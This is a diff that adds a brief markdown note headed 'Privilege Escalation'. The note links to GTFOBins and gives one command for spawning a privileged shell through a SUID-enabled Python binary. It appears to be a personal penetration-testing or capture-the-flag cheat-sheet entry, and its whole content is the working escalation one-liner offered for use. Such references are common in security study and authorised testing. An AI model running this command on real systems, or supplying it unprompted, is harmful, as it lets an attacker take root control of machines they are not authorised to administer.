@@ -1,0 +1,7 @@
+# Privilege Escalation
+https://gtfobins.github.io/
+
+
+## SUID /usr/bin/python
+then for privilege Escalation
+cmnd: python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
